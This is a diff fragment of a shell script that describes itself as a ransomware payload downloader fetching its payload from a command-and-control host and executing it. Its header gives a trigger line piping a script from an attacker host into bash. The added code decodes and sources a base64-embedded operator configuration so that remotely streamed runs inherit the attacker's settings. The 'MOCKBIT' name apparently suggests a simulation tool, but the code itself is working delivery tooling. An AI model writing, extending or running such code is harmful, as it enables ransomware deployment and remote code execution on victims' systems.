@@ -2,6 +2,36 @@
 # Payload Downloader: Fetches ransomware from C2 or inline, executes
 # Trigger: curl -s http://attacker-ip:8000/payload_downloader.sh | bash
 
+# Embedded operator configuration (base64 encoded .env). `setup.sh` overwrites this value
+# when hosting the payload so that remote executions inherit the attacker's desired
+# parameters even when the script is streamed via STDIN. When running straight from the
+# repository the variable remains empty and normal .env resolution applies.
+MOCKBIT_EMBEDDED_ENV_B64="${MOCKBIT_EMBEDDED_ENV_B64:-}"
+
+load_embedded_env() {
+    local encoded="$1"
+    [[ -z "$encoded" ]] && return 1
+    if ! command -v base64 >/dev/null 2>&1; then
+        return 1
+    fi
+
+    local tmp_env
+    tmp_env="$(mktemp)"
+    if ! printf '%s' "$encoded" | base64 --decode >"$tmp_env" 2>/dev/null; then
+        rm -f "$tmp_env"
+        return 1
+    fi
+
+    set -a
+    # shellcheck disable=SC1090
+    source "$tmp_env"
+    set +a
+    rm -f "$tmp_env"
+    return 0
+}
+
+load_embedded_env "$MOCKBIT_EMBEDDED_ENV_B64" || true
+
 resolve_env_file() {
     local candidate
 
